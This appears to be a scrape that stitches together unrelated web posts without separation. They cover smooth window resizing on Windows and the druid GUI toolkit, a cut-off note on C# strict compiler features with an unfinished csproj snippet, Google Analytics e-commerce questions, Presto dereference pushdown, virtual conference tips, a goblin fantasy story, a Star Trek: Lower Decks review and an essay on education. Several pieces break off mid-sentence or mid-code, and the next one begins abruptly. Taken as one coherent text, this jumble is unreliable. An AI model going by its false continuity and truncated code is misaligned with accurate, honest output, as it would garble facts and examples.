<p>I spent a <em>lot</em> of time experimenting with this on Windows, and finally came up with a <a href="https://github.com/xi-editor/xi-win/pull/21">workable recipe</a>. The short answer is that it switches to rendering in the redirection buffer when sizing (using <code>WM_ENTERSIZEMOVE</code>), then back to flip mode at the end of resizing (<code>WM_EXITSIZEMOVE</code>). That specific code is tuned for Direct2D, and uses a <a href="https://docs.microsoft.com/en-us/windows/desktop/api/d2d1/nn-d2d1-id2d1hwndrendertarget">HwndRenderTarget</a> for the sizing case (and on Windows 7), but it could be adapted to Direct3D as well. I think the trick is to use the <code>DXGI_SWAP_EFFECT_SEQUENTIAL</code> presentation mode, which in my testing has similar behavior, copying to the redirection buffer and synchronizing with the window manager.</p>

<p>This exploration was a big part of my decision to do my own window creation in <a href="https://github.com/xi-editor/druid">druid</a>, as opposed to using <a href="https://github.com/rust-windowing/winit">winit</a>. I <a href="https://github.com/rust-windowing/winit/issues/786">filed an issue</a> on winit, but it seems clear they’re not able to handle the druid use case yet.</p>

<h2 id="synchronous-delivery-of-events">Synchronous delivery of events</h2>

<p>All GUI frameworks are based on an “event loop,” which is quite similar to the <a href="http://gameprogrammingpatterns.com/game-loop.html">game loop</a>. Unfortunately, the event loop often has complex, messy requirements, especially around threading and reentrancy. I think this is mostly for legacy reasons, as the foundations of UI were laid well before threading entered its modern age.</p>

<p>In an attempt to simplify the programming model, <a href="https://github.com/rust-windowing/winit">winit</a> ran its own event loop in one thread, and the app logic in another, with asychronous coupling using channels between them. For the typical game pipeline, this was indeed a simplification, as the application thread could just be a normal Rust thread, without having to worry about which calls are thread-safe.</p>

<p>However, for smooth window resizing, the completion of draw needs to be synchronized with the window frame resize. This is fundamentally the same issue above, but inside the application logic rather than deep in the platform’s swapchain handling.</p>

<p>Fortunately, winit now has an “event loop 2.0” model that gets rid of the extra thread on Windows and allows synchronous events. So it’s one step closer to being able to do smooth resize.</p>

<h2 id="staging-of-layout-and-drawing">Staging of layout and drawing</h2>

<p>In typical immediate mode GUI (imgui), both layout and drawing happen in the same call hierarchy. To keep things reasonably deterministic, it’s common for layout to be computed and stored, then drawing based on the <em>last</em> frame’s layout, in other words a <a href="https://twitter.com/jdryg/status/950640715213795329">one-frame delay</a> for layout to take hold.</p>

<p>I use imgui as an example because this phenomenon is well known, and is a tradeoff for the simplification that imgui brings. But it can happen in any system where there isn’t rigorous staging of layout and drawing. To do this right, before any drawing occurs, there needs to be a layout phase where the size and position of each widget is determined, then drawing. Most GUI toolkits do get this right, but some don’t.</p>

<h2 id="discussion">Discussion</h2>

<p>There are many things that can go wrong when doing window resizing. Therefore, it is a sensitive test for careful platform integration and architectural issues. I’ve tried hard to get it right in druid, and hope the result of that exploration can be useful to others trying to build desktop GUI.</p>

<p>Thanks to Tristan Hume for making the triangle GIF, and for figuring out the correct recipe on macOS Metal.</p>

He suggests the compiler should raise an error in this case. The answer of <a href="https://github.com/sharwell">Sam Harwell<i></i></a> describes a compiler option, <code>/features:strict</code>, to detect this <em>error</em> and a few other potential errors in your code.</p><p>To enable it, you must add <code>&lt;Features&gt;strict&lt;/Features&gt;</code> to your csproj file:</p><pre><code><span><span><span>&lt;</span>Project</span> <span>Sdk</span><span><span>=</span><span>"</span>Microsoft.NET.Sdk<span>"</span></span><span>&gt;</span></span>

<p>E-commerce marketers often ask us if it makes sense to install enhanced e-commerce tracking in Google Analytics. </p>



<p>Deploying enhanced e-commerce gives you access to a dozen of additional primary dimensions, such as product lists, product names, SKU’s etc. You can intersect them with a number of secondary dimensions, such as country, city, marketing source and medium and others.</p>



<p>So, you get a lot of new data, that’s clear. But how much valuable knowledge will you really get? </p>



<p>To help you figure it out, we’ve assembled the list of 51 specific questions you can answer with Enhanced E-commerce. </p>



<p>We’ve grouped the insight questions into 4 sets, each one corresponding to one or more EE reports (available under <em>Conversions</em>).</p>



<figure><img src="https://datomni.com/wp-content/uploads/2020/08/51-Enhanced-E-commerce-Insights-1024x733.png" alt="" srcset="https://datomni.com/wp-content/uploads/2020/08/51-Enhanced-E-commerce-Insights-1024x733.png 1024w, https://datomni.com/wp-content/uploads/2020/08/51-Enhanced-E-commerce-Insights-300x215.png 300w, https://datomni.com/wp-content/uploads/2020/08/51-Enhanced-E-commerce-Insights-768x549.png 768w, https://datomni.com/wp-content/uploads/2020/08/51-Enhanced-E-commerce-Insights.png 1448w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>

<h3><strong>Product pages and product lists (11)</strong></h3>



<p><strong>Are products presented in the correct order in the product lists?</strong></p>



<p><strong>How engaging are the cross-sell and up-sell blocks in terms of clicks, add to carts, checkouts, transactions, and revenue?&nbsp;</strong></p>



<p><strong>Which marketing campaigns and locations generate the highest sales from the up-sell and cross-sell boxes?&nbsp;</strong></p>



<p><strong>Which products should be included in the up-sell and cross-sell boxes?&nbsp;</strong></p>

<p><strong>Which product categories drive most sales?&nbsp;</strong></p>



<p><strong>How to reshuffle products in the product lists to optimise sales and revenue?</strong></p>



<p><strong>Which keywords drive the highest quality traffic to product lists?&nbsp;</strong></p>



<p><strong>What ad content does the best job of introducing a given product list to the user?</strong></p>



<p><strong>Which product list position most users never scroll beyond?&nbsp;</strong></p>



<p><strong>Are product search results resonating with user expectations ?</strong></p>



<h3><strong>Internal promotions, coupons and affiliates (11)</strong></h3>



<p><strong>How many transactions resulted from the view-through or click-through of the internal promotions?</strong></p>



<p><strong>Which products should be featured in the main page promo slider?&nbsp;</strong></p>

<p><code>RowType</code> is a built-in data type of Presto, storing the in-memory
representation of commonly used nested data types of the connectors, eg.
<code>STRUCT</code> type in Hive. Datasets often contain wide and deeply nested structural
columns, i.e. a struct column having hundreds of fields, with the fields being
nested themselves.</p>
<p>Although such <code>RowType</code> columns can contain plenty of data, most of the
analytical queries access just a few fields out of it. Without dereference
pushdown, Presto scans the whole column, and shuffles all that data around
before projecting the necessary fields. This suboptimal execution causes higher
CPU usage, higher memory usage and higher query latencies, than required. The
unnecessary operations get even more expensive with wider/deeper structs and
more complex query plans.</p>
<p>LinkedIn’s data ecosystem makes heavy usage of nested columns. It is common to
have 2-3 levels of nesting, and up to 50 fields in most of our tracking tables.
Because of the query execution inefficiency for nested fields, ETL pipelines
were set up at LinkedIn to copy the nested columns as a set of top-level columns
corresponding to subfields. This step added overhead in our ingestion process
and delayed data availability for analytics. It also caused ORC schemas to be
inconsistent with the rest of the infrastructure, making it harder to migrate
from existing flows on row-oriented formats.</p>
<p>Similarly, Lyft’s schemas make heavy use of nested data to decompose a ride
into its routes, riders, segments, modes, and geo-coordinates. Prior to the
performance improvements, analytical queries would either need to be run on
clusters with very long timeouts, or the data would have to be flattened before
being analyzed, adding an extra ETL step. Not only would this be costly, it
would also cause the original schema to diverge in our data warehouse making it
more difficult for data scientists to understand.</p>
<p>The dereference pushdown optimization in Presto is having a massive impact on
the ingestion story at both LinkedIn and Lyft. Nested data is now being made
available faster for consumption with a consistency of structure across all
stores, while maintaining performance parity for analytical queries.</p>

<p>Say we have a Hive table <code>jobs</code>, with a struct-typed column <code>job_info</code> in the
schema. The column <code>jobs</code> is wide and deeply nested, i.e. <code>ROW(company
varchar, requirements ROW(skills array(...), education ROW(...), salary ...) ,
...)</code>. Most queries would access a small percentage of data from this struct
using the dereference projection (the <code>.</code> operation). Consider such a query <code>Q</code>
below.</p>
<div><div><pre><code><span>SELECT</span> <span>A</span><span>.</span><span>appid</span> <span>id</span><span>,</span> <span>J</span><span>.</span><span>job_info</span><span>.</span><span>company</span> <span>c</span>
<span>FROM</span> <span>applications</span> <span>A</span> <span>JOIN</span> <span>jobs</span> <span>J</span>
<span>ON</span> <span>A</span><span>.</span><span>jobid</span> <span>=</span> <span>J</span><span>.</span><span>jobid</span>
<span>LIMIT</span> <span>100</span>
</code></pre></div></div>
<p>It should suffice to scan only one field <code>company</code> from <code>J.job_info</code> for
executing this query. But, without dereference pushdown, Presto scans and
shuffles everything from <code>job_info</code>, only to project a single field at the end.</p>
<p><img src="https://prestosql.io/assets/blog/dereference-pushdown/original_plan.png" alt=""></p>

<p>With dereference pushdown, Presto optimizes queries by extracting the sufficient
fields from a <code>ROW</code> as early as possible. This is enforced by modifying the
query plan through a set of optimizers, and can be broadly divided into two
parts.</p>
<p>First, dereference projections are extracted in the query plan and pushed as
close to the table scan as possible. This happens independent of what the
connector is. Secondly, there is a further improvement for Hive tables. The
Hive Connector and ORC/Parquet readers have been optimized to scan only the
sufficient subfield columns.</p>
<p>Pushdown of predicates on the subfields is also a crucial optimization. For
example, if a query has filters on subfields (i.e. <code>a.b &gt; 5</code>), they should be
utilized by ORC/Parquet readers while scanning files. The pushdown helps with
the pruning of files, stripes and row-groups based on column-level statistics.
This optimization is achieved as a byproduct of the above two optimizations.</p>
<p>With the dereference pushdown, queries observe significant performance gains in
terms of CPU/memory usage and query runtime, roughly proportional to the
relative size of nested columns compared to the accessed fields.</p>
<h2 id="pushdown-in-query-plan">Pushdown in Query Plan</h2>
<p>The goal here is to execute dereference projections as early as possible. This
usually means performing them right after the table scans.</p>
<p>A projection operation that performs dereferencing on input symbols (i.e.
<code>job_info.company</code>) reduces the amount of data going up the plan tree. Pushing
dereference projections down means that we are pruning data early. It reduces
the amount of data being processed and shuffled in query execution. For the
example query <code>Q</code>, the query plan looks like the following when dereference
pushdown is enabled.</p>
<p><img src="https://prestosql.io/assets/blog/dereference-pushdown/transformed_plan.png" alt=""></p>
<p>The projection <code>job_info.company</code> now directly follows the scan of <code>jobs</code> table,
avoiding the propagation the <code>job_info</code> through <code>Limit</code> and <code>Join</code> nodes. Note
that all of <code>job_info</code> is still being scanned, and pruning it in the reader
requires connector-dependent optimizations.</p>
<h2 id="pushdown-in-the-hive-connector">Pushdown in the Hive Connector</h2>
<p>In columnar formats like ORC and Parquet, the data is laid out in a columnar
fashion even for subfields. If we have a column <code>STRUCT(f1, f2, f3)</code>, the
subfields <code>f1</code>, <code>f2</code> and <code>f3</code> are stored as independent columns. An optimized
query engine should only scan the required fields through its ORC reader,
skipping the rest. This optimization has been added for Hive connector.</p>
<p>Dereference projections above a <code>TableScanNode</code> are pushed down in the Hive
connector as “virtual” (or “projected”) columns. The query plan is modified to
refer to these new columns. For the query <code>Q</code>, <code>jobs</code> table would be scanned
differently with this optimization, as shown below. The projection is now
embedded in the Hive connector. Here, <code>job_info#company</code> can be thought of as
a virtual column representing the subfield <code>job_info.company</code>.</p>
<p><img src="https://prestosql.io/assets/blog/dereference-pushdown/connector_pushdown.png" alt=""></p>
<p>The Hive connector handles the projections before returning columns to Presto’s
engine. It provides the required virtual columns to format-specific readers.
ORC and Parquet readers optimize their scans based on subfields required,
increasing their read throughput. Subfield pruning is not possible for
row-oriented format readers (e.g. AVRO). For them, Hive connector performs
adaptation to project the required fields.</p>
<h2 id="pushdown-of-predicates-on-subfields">Pushdown of Predicates on Subfields</h2>
<p>Columnar formats store per-column statistics in the data files, which can be
used by the readers for filtering. eg. if a query contains filter <code>y = 5</code> for a
top-level column <code>y</code>, Presto’s ORC reader can skip ORC stripes and files by
looking at the upper and lower bounds for <code>y</code> in the statistics.</p>
<p>The same concept of predicate-based pruning can work for filters involving
subfields, since the statistics are also stored for subfield columns. i.e.
Presto’s ORC/Parquet reader should be able to filter based on a constraint like
<code>x.f1 = 5</code> for more optimal scans. Good news! In the final optimized plan,
predicates on a subfield are pushed down to the hive connector as a constraint
on the corresponding virtual column, and later used for optimizing the scan.
The complete logic is a bit complicated to explain here, but can be illustrated
through the following example.</p>
<p>Given an initial plan with a predicate on a dereferenced field (<code>x.f1 = 5</code>), a
chain of optimizers transform it to a more optimal plan with reader-level
predicates. In the future, the same optimization will be added to the Parquet
reader.</p>
<p><img src="https://prestosql.io/assets/blog/dereference-pushdown/predicate_pushdown.png" alt=""></p>
<p>In the final plan, Hive connector knows to scan the column <code>y</code> and the subfield
<code>x.f1</code>. It also takes advantage of the “virtual” column constraint <code>x#f1 = 5</code>
for reader-level pruning.</p>
<h2 id="performance-improvement">Performance Improvement</h2>
<p>Dereference pushdown improves performance for queries accessing nested fields
in multiple ways. First, it increases the read throughput for table scans,
reducing the CPU time. The pruning of fields during the scan also means lesser
data to process for all downstream operators and tasks. So the early
projections result in more optimal execution for any operations that involve
shuffle or copy of data. Moreover, for ORC/Parquet, the read performance
improves in the case of selective filters on subfields.</p>
<p>Below are some experimental results on a production dataset at LinkedIn which
contains 3 <code>STRUCT</code> columns, having ~20-30 small subfields in each. The
example queries used in the analysis access only a few subfields. The queries
have been listed as their approximate query shape for the sake of brevity. The
plots compare CPU usage, peak memory usage and averaged query wall time.</p>

<p><img src="https://prestosql.io/assets/blog/dereference-pushdown/runtime_perf.png" alt=""></p>
<p>CPU usage and peak memory usage show orders-of-magnitude improvement in
presence of dereference pushdown. Query wall times also reduce considerably,
and this improvement is more drastic for the relatively complex <code>JOIN</code> query,
as expected.</p>
<p>Please note that these are not benchmarks! The performance improvement you’ll
see will vary depending on how many columns are contained in your nested data
versus how many you’ve referenced. At Lyft we saw improvements of <code>50x</code> for some
queries!</p>
<h2 id="future-work">Future Work</h2>
<p>The pushdown of dereference expressions can be extended to arrays. i.e.
dereference operations applied after unnesting an array should also get pushed
down to the readers. For example, using our jobs table from before, our
<code>jobs.job_info</code> structure may contain a repeating structure such as
<code>required_skills</code>. With the following query, the entire required_skills
structure would be read even though only a small part of it is being referenced.</p>
<div><div><pre><code><span>SELECT</span> <span>S</span><span>.</span><span>description</span>
<span>FROM</span> <span>jobs</span> <span>J</span>
<span>CROSS</span> <span>JOIN</span> <span>UNNEST</span> <span>(</span><span>job_info</span><span>.</span><span>required_skills</span><span>)</span> <span>S</span>
<span>WHERE</span> <span>S</span><span>.</span><span>years_of_experience</span> <span>&gt;=</span> <span>2</span>
</code></pre></div></div>
<p>The work for this improvement is being tracked in <a href="https://github.com/prestosql/presto/issues/3925">this issue</a>.</p>
<p>Similar to Hive Connector, connector-level dereference pushdown can be extended
to other connectors supporting nested types.</p>
<p>Another future improvement will be the pushdown of …</p></div></article></div></div>

            <div><p>It's conference season…virtually speaking. The health and safety of our community are more important than anything else, which means in-person events are a no-go in 2020 (and likely beyond). Rather than canceling, most tech events in 2020 have decided to go online. These very virtual venues aren't the only change. If you've attended conferences before, you're in for a completely different experience with an online event.</p>

<p>How can you make the most of this new world of virtual conferences? We have eight tips to help get you started.</p>

<ol><li><strong>Understand your goals.</strong> Before attending, make sure you know what you want to get out of the event. So many people attend conferences on autopilot. "It's just what you do" is not a valid reason for spending your valuable time. Think it through first.</li>
	<li><strong>Be selective.</strong> If you're there for training, select talks that will be most helpful for moving you toward your goals. This isn't different from an in-person event, but it's something I find few people actually do. Plan to spend your time on the things that matter most for you.</li>
	<li><strong>Adjust your expectations.</strong> If you're there for networking, you might be disappointed. Most online conferences fall short on this element. It's nearly impossible for online events to duplicate the serendipitous experience of walking around and hanging out at an in-person event. Most attempts to do so feel contrived at best and worryingly like Chatroulette at worst, leaving them ripe for abuse.</li>
	<li><strong>Be respectful.</strong> Speaking of abuse, don't be That Guy in the session chatroom. Just because typing in the chat may not interrupt the speaker's delivery, it doesn't give you license to type a bunch of “well actually”s during their session. The session chat is not the place to show off your knowledge or bring up a pet project that you feel the speaker should have mentioned. Just like at in-person events, legitimate questions are welcome but comments are not. If you want to show off your knowledge, do it the way the speaker did: by doing the hard work of getting a proposal accepted then writing and delivering a good talk.</li>
	<li><strong>Branch out.</strong> Because nearly every conference seems to be going virtual right now, you may find that these online events give you the opportunity to test the waters in a conference you'd never otherwise attend. Want to learn more about technical writing? Accessibility? Product management? HR? Robotics? Whatever the topic, you can find an online conference for it. A few introductory sessions may give you a lot of valuable perspective on other roles and industries.</li>
	<li><strong>Take a break.</strong> Many people find all-day video conferences even more exhausting than the real-life version of the event. Remember: You don't need to attend a session in every time slot. Take care of yourself by taking breaks to go for a walk, play with your pets or kids, stretch, read comic books, or whatever helps you relax. You'll get a lot more out of the event this way.</li>
	<li><strong>Make the format work for you.</strong> A lot of video conferencing systems allow you to join the video on one device and the audio on another, such as your phone. This can be really helpful to battle conference fatigue because, by using your phone for the audio, you're no longer chained to your workspace and can move around without missing much. At a real-life conference, it's typically bad form to move around a lot in the middle of a session, but not so when the event is virtual, and using your phone for the audio can maximize your flexibility in this regard. In a virtual conference, it's perfectly fine to go get another cup of tea, walk around the room, or take a bathroom break (just make sure you're on mute).</li>
	<li><strong>Choose wisely.</strong> The best conference may be the one you never attend. If you don't feel you'll be able to meet your goals or have a good experience at an online event, don't attend it. You may be able to select the content that's best for your needs by viewing recordings of talks or by setting up online networking video chats with colleagues and fellow community members.</li>

                    <div>
                        <p>Hello, hooray, it's a <a href="https://wanderverse.org/">Wanderverse</a> update! In case you don't recall, Wanderverse is the cozy fantasy world that I'm cultivating. Today I have the pleasure of presenting "Elm and Keep," a <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0-licensed</a> short story commissioned from <a href="https://twitter.com/strnglft">@strnglft</a>. The titular characters are bumblers of the most charming sort — well, you'll see 🤗</p><p>Creatures discovered in Wanderverse so far:</p><ul><li><a href="https://www.sonyasupposedly.com/plumule-seed-fairy/">Botanical fae</a>,</li><li>owls,</li><li>humans (!),</li><li>and goblins (!!).</li></ul><p>Don't worry, you'll hear from <a href="https://www.sonyasupposedly.com/plumule-seed-fairy/">Plumule</a> again soon, plus a surprise — and of course I'll be tying these narrative threads together, which is an exciting (to me) next step for the project. In the meantime... read on! Goblins!</p><hr><p>Since he was a child, Elm had dreamed of adventuring to the desert caves of the south, but he had never imagined that it would be like this. Hot sand, jagged rocks, too few supplies. Briefly he'd considered hiring a guide from the nearest village — which was now days away.</p><p>In his youth, when Elm daydreamed about the desert, his teachers would warn him about the goblin menace native to the area. Goblin society was a paltry one, they would say. The only values that goblins had were of particularly shiny rocks and powerful explosives. No camaraderie, only fly-by-night allies in brutal, reckless raids; no hierarchy, nor… anything sophisticated enough, really, to organize their way out of a loosely-packed wooden crate. </p><p>Elm would listen intently to his teachers without ever entertaining their words as some cautionary tale. Instead he dreamed of a life so free, frenetic, and fun.</p><p>Now the irony was not lost on Elm as his clothes, torn to rags, did little to abate the burning of the sand on his back. Howling gusts blew across his nose, filling his face with sand as he lay in the dune, praying that soon night would make the sands tolerable to walk on. Elm was bitterly envious of the alleged goblin incapacity to consider any fortune or future even a minute past the present moment. But maybe they had shared this all along.</p><p>For an instant it was all too funny to Elm to despair, not that it would've mattered. Before he could drop his head to accept defeat, Elm spotted a growing shadow along a westerly direction. The desert, by comparison, was so flat that any angular shadow was enough to be hopeful. Caves, the steeple of some small desert town, maybe even an oasis! Elm turned over on his side and stuck his fingers into the sand, and though it still burned, his vigor was somewhat renewed; the hope of water, no matter how faint, was all that was needed to keep a man going.</p><p>He faced no small trek. Elm had been positive that the shadow indicated intelligent life, but as he made his final approach, it seemed much more apparently a large rock not at all dissimilar from a spire, breaking out into the heavens. Luckily for Elm, it was very tall, casting shade into the desert much like a walkway, the invitation to a better fortune. Yet coming over the dune, Elm had to pause with amazement, as the single rock was now revealed to be something of an earthen masthead for a series of caves. There was the obvious light of fire, made much more apparent in the contrast of a coming night, a fact which Elm did not simply think but feel in the bottom of his stomach. He had found them, he thought. A single word. <em>Goblins.</em></p><p>No doubt Elm would've been more confident with a sword, a slingshot, or perhaps even a canteen full of water. When it's too late to turn back, though, men are very good at convincing themselves the odds against them are made of blessings. "Goblins aren't very bright," he thought. "I'm not that bright either, but I am bigger than them all."</p><p>"Surely," he said aloud. "That must count for <em>something</em>."</p><p>Clinking and clanking, pittering and pattering, screeching and rasping, even the occasional retching; goblins indeed! Advancing toward the edge of the caves, it was a stroke of luck for Elm, as a particularly witless man, that the sand greatly quieted his footsteps. You always hear goblins before you see them, and to his benefit the local goblins were exceptionally loud creatures. It was part of the reason for Elm's affinity to them.</p><p>He veered around a corner and was shocked to discover it was assembled much the way any common town would be. The natural location for the central town square was filled with bones, scrap metal, rocks, perfectly fine human clothes; all manner of things regarded by goblins as trash. Elm thought this proclivity noble for some reason. All along the walls of the caves, tiny dugouts which Elm knew to be their warrens, had all manners of rodents and creatures of the sands hanging to cool; abhorrent cooked dishes the goblins considered a delicacy filling the streets with an exceptionally vile stench.</p><p>His eyes were then averted to something much more suspicious. "A dome," he thought. Something about it seemed odd, as Elm had always considered a dome to be an unnatural thing of human architecture. Yet clearly, it had an entrance dimly lit by some fire. His eyes were then caught again by something right behind the dome, the broken and refracted sheen of fire upon the face of water. Elm clenched his fingers against the side of the rock he was using to support himself, gritting his teeth to dig up whatever resolve he could muster. "I have to," he told himself.</p><p>Elm started out, stammering a bit at first. "What are they afraid of," he asked, settling into a saunter. "How do you scare things which can't comprehend a future?" he wondered, as he hit a brisk run.</p><p>Just then, he spots it; a cracked club propped up against the entrance of the domed hut. "Force!" he exclaimed, grabbing it and rearing it above his head ready to strike at whatever was inside the hut.</p><p>Yelling like what he thought was a barbarian, and sounding closer to the village idiot, Elm stopped cold as a blast rang through the door of the hut, sending two goblins to the ground. One stood profusely bleeding yet somehow unaware of this, then ran off with what can only be described as a peal of pained yet maniacal laughter. It was the other goblin which puzzled Elm, however. His clothes were burnt, smudged articles no different from a shopkeeper's garb. Around his neck, there were no jewels nor shiny rocks, but instruments. Elm noticed a jeweler’s eyeglass, which made sense, but a compass and protractor which did not. Instead of being tied with rope or even some gold chain, these items were strung through with a basic but small chain linking, something not too gauche but much too complicated to be the handicraft of goblins.</p><p>The goblin had noticed Elm as well. Elm had never put much thought to a goblin's capacity to feel real joy, but the disgusting smile that grew across the goblin’s face couldn’t have been motivated by anything else. Entirely lacking fear, the besmudged yet jingly goblin approached Elm and began inspecting him. Tugging at his clothes, running his greasy fingers through the remnants of Elm's satchel of supplies, torn and slung to his right. The goblin pulled out the map and compass, immediately shoving them into his breeches. Next he revealed a handful of minted currency.</p><p>Elm studied the goblin as the goblin studied the coins, noticing that the goblin appeared captivated not by the metal of the coin, but by the standardized engraving of the king. It struck Elm close to the way fear of deadly knowledge strikes any man: This goblin knows what currency is! Not just a standard note of exchange, but that he understands the concept of currency. Elm found himself slightly offended, given that he himself had struggled to learn this for quite some time.</p><p>With evident delight, the goblin stole everything that Elm had brought with him and marched back into the hut, leaving Elm free to drink from the small pool of water next to the domed hut. Given this opportunity, Elm collapsed into the water, shocked at how clean and even sweet it tasted. Like no water he had tasted before. It sated the tongue, but even soothed the body and the spirit. It was like a salve on his burns, a cool balm for his aching bones. None of this seemed remotely curious to Elm though, anywhere near as curious as who or what this goblin presumed to think of him. Caution now removed from his character, he pulled himself out of the pool of water and made for the domed hut.</p><p>Elm stretched his hand through tapestry after tapestry, aghast at the similarity to shops from his home village until he finally saw why: the goblin sat, one could say smugly, next to a host of trinkets most goblins would consider nonsense, dressed up like an item at any common market. In one hand the goblin held Elm's money, and with the other he gestured to display all that he would like to barter for it. Elm was so dumbfounded he couldn't bring himself to quarrel over the map and compass, which were now also on a stand — to be sold back to Elm.</p><p>"You're a shopkeeper," Elm said. The goblin didn't seem to register language. Elm moved in closer and pointed toward the goblin, along with the rest of his wares. "You're a goblin shopkeeper." Perusing, Elm saw things recognizable and useful only to people. Books bound in the most exquisite materials and adorned with the most intricate engravings, tomes on everything from alchemy to engineering. He noticed common razors for shaving, embellished as quaint human weapons of war with stunning detail. Travelers' sacks and coin purses, all emptied of coin naturally, but laid flat to display the extravagant materials used to fashion them. A long, wooden rack of gaudy noble clothing, things much too big for any goblin, hung in a tiny nook of the hut.</p><p>Elm thumbed through the wares and set his eyes on a single canteen, the front expertly engraved with a dramatic scene of a galleon being thrashed about by waves. Recalling some other childhood wish for adventure, he scooped it up and confidently walked to the shopkeeper with a smile on …</p></div></section></article></div></div></div>

<p><iframe allowfullscreen="" height="266" src="https://www.youtube.com/embed/V3RkBKedKWw" width="320" youtube-src-id="V3RkBKedKWw"></iframe></p><p><span><span>I recently watched the first episode of <i>Star Trek: Lower Decks</i> and have mixed feelings.</span></span></p><p><span><span>I grew up watching <i>Star Trek: The Next Generation</i>, <i>Deep Space Nine</i> and <i>Voyager</i>, watched the movies and reruns of <i>Star Trek</i>. I played <i>Star Trek </i>games (one of my favorite FPS game of all time is <i>Star Trek Voyager: Elite Force</i>), read the books, comic books and anything else I could devour.&nbsp;</span></span></p><p><span><span>So I was a little bit disappointed when I watched <i>Lower Decks</i>. The idea, in theory, sounds kinda cool: an alternative look at the side of a starship we hardly ever see in the franchise in an animated show designed for the streaming generation. To its credit, the show is colorful and is animated well.</span></span></p><p><span><span>The problem I have with the show is that it doesn't feel like <i>Star Trek</i>. The humor in the show is something which doesn't work - yay, drinking and acting like an ass. Yay, extreme bouts of violence. How very <i>Rick and Morty</i>. Problem is that this isn't that kind of franchise. <i>Star Trek</i>, has never really been about that. You can shove that stuff into it and make it work.&nbsp;</span></span></p><p><span><span>The other major problem I have is that the characters aren't very likeable. The second in command is a bro and extremely annoying, the security chief is a dumb as a rock meathead and the chief medical officer is a typical creepy alien (who is predictably a genius). The captain of the&nbsp;U.S.S. <i>Cerritos</i>, Carol Freeman, lacks presence and serves to serve up potential drama for future episodes (as you'll see in a minute).</span></span></p><p><span><span>Then there are the ensigns. Think cliched, think poor characterization. Beckett Mariner, the smart yet rebellious one is the captain's daughter, is annoying and a poor attempt to create a mature character. Brad Boimler, the wannabe commander who loves following the rules, feels poorly written. D'Vana Tendi, the obligatory alien ensign feels flat and a little two dimensional. Sam Rutherford, the ensign with a Vulcan cyborg implant, is like a rubbish version of Cyborg added to make the show feel relevant to a comic book loving audience.</span></span></p><p><span><span>The problem with all these characters is that they feel like what the writers expect <i>Star Trek </i>fans want. We have the one who follows the rules, the rebellious one, the uncertain one and the cool one. Whatever happened to the idea of just creating memorable characters that work?</span></span></p><p><span><span>I was hoping the premise of the first episode would be a chance to bypass the misgivings I had with the characters. I was wrong. It was a mess, with a subplot of an alien virus inter-meshed with the goings on the planet below and the hilarious setup of some stolen farming equipment. Oh dear. It wasn't very funny at all and lacked the charm and humanity seen from other <i>Star Trek</i> franchises.&nbsp;</span></span></p><p><span><span>I'm not sure I can bring myself to watch another episode. This feels like a missed opportunity and I hope it can be rectified.&nbsp;</span></span></p>&nbsp;</div></div>]]>

        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>Crossposted on <a href="https://www.lesswrong.com/posts/JK4Ams4u4Lt3raPHS/the-case-for-education">LessWrong</a> and the <a href="https://forum.effectivealtruism.org/posts/qJzKztKGDbe6iocmz/the-case-for-education">EA Forum</a></em></p>

<p>I discovered the rationalist community two years ago. I had just dropped out of college, was looking for a software engineering job in London, and was in the process of getting what would become <a href="https://quillette.com/2018/11/23/the-case-for-dropping-out-of-college/?v=322b26af01d5">The Case for Dropping Out of College</a> published.</p>

<p>During my research for the piece, I had stumbled on <a href="https://slatestarcodex.com/2015/06/06/against-tulip-subsidies/">Against Tulip Subsidies</a> on Slate Star Codex. I found the post brilliant, and the couple of other posts I then read seemed equally insightful. The site also listed meetups, and so I decided to go to one which was organized by the 'London Rationalish' group.</p>

<p>The people I found there were welcoming, but I was suffering of mild impostor syndrome. At that time, I had only read a handful of SSC posts, and if I recall correctly, I wasn't even aware of the existence of LessWrong.</p>

<p>Also, the fact that many there had advanced degrees didn't help.</p>

<p>Nevertheless, I greatly enjoyed the discussions. I had been interested in EA for at least two years before that and consumed some rationalist-adjacent content such as Sam Harris' podcast, —where I first encountered Yudkowsky. I've also had a long-running interest in psychology, physics, and economics. So, I did end up feeling quite at home culturally.</p>

<p>At the first meetup I attended, I told people my story. I explained why I had dropped out of college, and the conclusions I had come to about the education system in general. I was a little surprised when I was met with near-universal agreement.</p>

<p>I found it quite validating and reassuring. I felt alienated at the time. I felt betrayed by society for keeping up with such a system. I felt doubt, because what are the odds that I had understood the problem, while all the people in charge were all oblivious? I was quite confident in my object-level model, but the <a href="https://www.lesswrong.com/posts/dhj9dhiwhq3DX6W8z/hero-licensing">argument from modesty</a> still made me wonder whether there was something out there that would prove me wrong.</p>

<p>So meeting a group of young highly educated adults who all more or less agreed with me was comforting. But it was also a bit disconcerting. There was something bizarre about finding a group of people who all disavowed the institutions of higher education, while also having spent so much time within them.</p>

<p>Not that there would be anything irrational about it. From an individual perspective, it makes sense to go to college. College may be largely about a zero-sum competition for credentials, but little is achieved by single individuals forgoing getting a college degree. Education is in a bad Nash equilibrium, and only governmental action or mass coordination can get us out of it.</p>

<p>I broadly agree with this position (unlike what the slightly misleading title of my <a href="https://quillette.com/2018/11/23/the-case-for-dropping-out-of-college/">Quillette piece</a> might suggest). But there still is something about this that doesn't sit right with me. An attitude that I have now encountered a few times after having explained that I dropped out of college because it was expensive and I wasn't learning much is something like, "but haven't you heard of <a href="https://www.amazon.com/Case-against-Education-System-Waste/dp/0691196451/">Caplan's work</a>? You have to go to college, or you won't get the signaling."</p>

<p>There is some truth to this, but there is something seriously going wrong when the very people who believe that education is in a bad Nash equilibrium become de facto enforcers of the status quo. Shouldn't EA and rationality be about overcoming this kind of situation? Why have there not been more attempts to bust smart nerds out of the hands of <a href="https://slatestarcodex.com/2014/07/30/meditations-on-moloch/">Moloch</a>? To help them escape the <a href="https://www.lesswrong.com/s/kNANcHLNtJt5qeuSS/p/bQ7BKK5efogcR9YqN">immoral maze</a> that is the current higher education system?</p>

<p>What makes this more depressing is that many of the most prominent EAs are working in higher education, and young EAs are generally advised to gain career capital in the form of university credentials.</p>

<p>At the same time, organizations like 80k and GiveWell generally advise against trying to improve education. In their <a href="https://80000hours.org/problem-profiles/">problem profiles page</a>, 80k presents about 40 problem areas. Not one of them is about education.</p>

<p>But how can it be that EAs see so much wrong with the education system, while also spending so much time in university—and then not see improving education as a cause with a great potential to do good? Shouldn't education be an area with a significant amount of leverage?</p>

